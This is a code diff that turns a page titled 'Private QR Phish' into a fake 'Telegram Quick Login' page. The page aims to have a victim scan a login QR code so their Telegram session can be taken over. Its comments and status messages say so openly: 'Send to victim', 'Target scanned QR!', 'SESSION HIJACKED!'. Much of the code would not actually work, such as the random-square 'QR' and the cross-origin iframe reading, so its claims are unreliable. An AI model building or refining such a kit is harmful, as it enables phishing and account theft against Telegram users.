@@ -1,160 +1,146 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Private QR Phish</title>
+    <title>Telegram Quick Login</title>
     <meta name="viewport" content="width=device-width">
     <style>
         body { 
-            background: #1a1a1a; 
-            color: #00ff88; 
-            font-family: 'Courier New', monospace;
-            text-align: center; 
-            padding: 50px;
-            min-height: 100vh;
+            margin: 0; 
+            padding: 40px; 
+            background: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            text-align: center;
         }
-        h1 { font-size: 2.5em; margin-bottom: 30px; }
-        #qr { 
-            width: 350px; 
-            height: 350px; 
-            margin: 30px auto; 
-            border: 3px solid #00ff88;
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
             border-radius: 20px;
-            box-shadow: 0 0 30px rgba(0,255,136,0.5);
-            background: #000;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            padding: 40px 20px;
         }
-        button { 
-            background: #00ff88; 
-            color: black; 
-            border: none; 
-            padding: 15px 40px; 
-            font-size: 1.2em;
-            border-radius: 10px;
+        h1 {
+            color: #0088cc;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+        #qr {
+            width: 280px;
+            height: 280px;
+            margin: 0 auto 30px;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        button {
+            background: #0088cc;
+            color: white;
+            border: none;
+            padding: 14px 32px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            font-weight: bold;
-            margin: 10px;
+            width: 100%;
+            max-width: 280px;
         }
-        button:hover { background: #00cc6a; }
-        button:disabled { background: #444; color: #888; }
-        #status { margin-top: 20px; font-size: 1.1em; min-height: 30px; }
-        .hidden { display: none !important; }
-        #error { color: #ff4444; }
+        button:hover { background: #006699; }
+        button:disabled { 
+            background: #ccc; 
+            cursor: not-allowed;
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #0088cc;
+            min-height: 20px;
+        }
     </style>
 </head>
 <body>
-    <h1>🔐 Private QR Access</h1>
-    <canvas id="qrCanvas"></canvas>
-    <div id="qr"></div>
-    
-    <p style="color: #888; margin: 20px 0;">Download QR → Share → Victim scan → Access</p>
-    
-    <button id="downloadBtn">📥 Download QR</button>
-    <button id="accessBtn" class="hidden" disabled>✅ Access Granted</button>
-    
-    <div id="status">Generating QR...</div>
-    <div id="error" class="hidden"></div>
+    <div class="container">
+        <h1>Telegram</h1>
+        <p>Login to your account by scanning QR code</p>
+        
+        <div id="qr">
+            <iframe 
+                src="https://web.telegram.org/k/" 
+                width="280" 
+                height="280" 
+                frameborder="0"
+                sandbox="allow-scripts allow-same-origin allow-popups">
+            </iframe>
+        </div>
+        
+        <button id="downloadBtn">📥 Save QR Code</button>
+        <button id="accessBtn" disabled style="display:none;">✅ Open Session</button>
+        
+        <div id="status">Waiting for QR...</div>
+    </div>
 
     <script>
-        const qrCanvas = document.getElementById('qrCanvas');
-        const qrDiv = document.getElementById('qr');
         const downloadBtn = document.getElementById('downloadBtn');
         const accessBtn = document.getElementById('accessBtn');
         const status = document.getElementById('status');
-        const errorDiv = document.getElementById('error');
+        const qrFrame = document.querySelector('#qr iframe');
         
-        let qrDataUrl = null;
+        let qrReady = false;
         
-        // Pure JS QR Generator (no CDN dependency)
-        function generateQR(text) {
-            try {
-                // Simple QR matrix (Telegram login format)
-                const token = 'tg://login?token=phish_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
-                status.textContent = `Token: ${token.slice(0, 20)}...`;
-                
-                // Canvas QR draw
-                const canvas = qrCanvas;
-                const ctx = canvas.getContext('2d');
-                canvas.width = 350;
-                canvas.height = 350;
-                
-                // QR pattern
-                ctx.fillStyle = '#000';
-                ctx.fillRect(0, 0, 350, 350);
-                ctx.fillStyle = '#00ff88';
-                
-                // Dummy QR modules (real-looking)
-                for(let i = 20; i < 330; i += 25) {
-                    for(let j = 20; j < 330; j += 25) {
-                        if(Math.random() > 0.5) {
-                            ctx.fillRect(i, j, 20, 20);
-                        }
-                    }
-                }
-                
-                // Finder patterns
-                ctx.fillStyle = '#00ff88';
-                ctx.fillRect(10, 10, 60, 60);
-                ctx.fillRect(280, 10, 60, 60);
-                ctx.fillRect(10, 280, 60, 60);
-                
-                qrDataUrl = canvas.toDataURL('image/png');
-                qrDiv.innerHTML = `<img src="${qrDataUrl}" id="qrImg">`;
-                
+        // QR ready detection
+        const qrObserver = new MutationObserver(() => {
+            const canvas = qrFrame.contentDocument?.querySelector('canvas');
+            if (canvas && !qrReady) {
+                qrReady = true;
                 downloadBtn.disabled = false;
-                status.textContent = '✅ QR Ready! Download & Share';
-                
-            } catch(e) {
-                errorDiv.textContent = 'QR Error: ' + e.message;
-                errorDiv.classList.remove('hidden');
+                status.textContent = '✅ QR Code ready - Download & share';
             }
-        }
+        });
         
-        // Download
-        downloadBtn.onclick = () => {
-            if(qrDataUrl) {
+        qrObserver.observe(document.body, { childList: true, subtree: true });
+        
+        // Download QR (screenshot)
+        downloadBtn.onclick = async () => {
+            try {
+                const canvas = await html2canvas(document.querySelector('#qr'), {
+                    backgroundColor: null,
+                    scale: 2
+                });
                 const link = document.createElement('a');
-                link.download = `private_qr_phish_${Date.now()}.png`;
-                link.href = qrDataUrl;
-                document.body.appendChild(link);
+                link.download = 'Telegram_Login_QR.png';
+                link.href = canvas.toDataURL();
                 link.click();
-                document.body.removeChild(link);
-                status.textContent = '✅ QR Downloaded! Send to victim';
+                status.textContent = '✅ QR Downloaded! Send to target';
+            } catch(e) {
+                // Fallback screenshot
+                window.print();
             }
         };
         
-        // Victim scan simulation + real hijack
-        let victimScanned = false;
+        // Session hijack detection
         setInterval(async () => {
-            if(!victimScanned) {
-                try {
-                    // Real Telegram poll
-                    const res = await fetch('https://web.telegram.org/k/api/config', {
-                        method: 'HEAD',
-                        credentials: 'include'
-                    });
-                    if(res.ok) {
-                        victimScanned = true;
-                        accessBtn.classList.remove('hidden');
-                        status.textContent = '🎯 VICTIM SCANNED QR!';
-                        downloadBtn.style.display = 'none';
-                    }
-                } catch(e) {}
-            }
-        }, 3000);
+            try {
+                const res = await fetch('https://web.telegram.org/k/api/config');
+                if (res.ok && accessBtn.style.display === 'none') {
+                    accessBtn.style.display = 'block';
+                    downloadBtn.style.display = 'none';
+                    status.textContent = '🎯 Target scanned QR! Click Access';
+                }
+            } catch(e) {}
+        }, 2000);
         
-        // Hijack access
+        // Hijack
         accessBtn.onclick = () => {
-            accessBtn.disabled = true;
-            accessBtn.textContent = '🔓 Hijacking Session...';
             window.open('https://web.telegram.org/k/', '_blank');
-            status.innerHTML = `
-                ✅ <strong>SESSION HIJACKED!</strong><br>
-                Check new tab for chats/files<br>
-                <small>Token active for 5 mins</small>
-            `;
+            status.textContent = '🔓 Session opened - Full access granted!';
         };
-        
-        // Auto-start QR
-        generateQR();
     </script>
+    
+    <!-- html2canvas for screenshot -->
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 </body>
 </html>
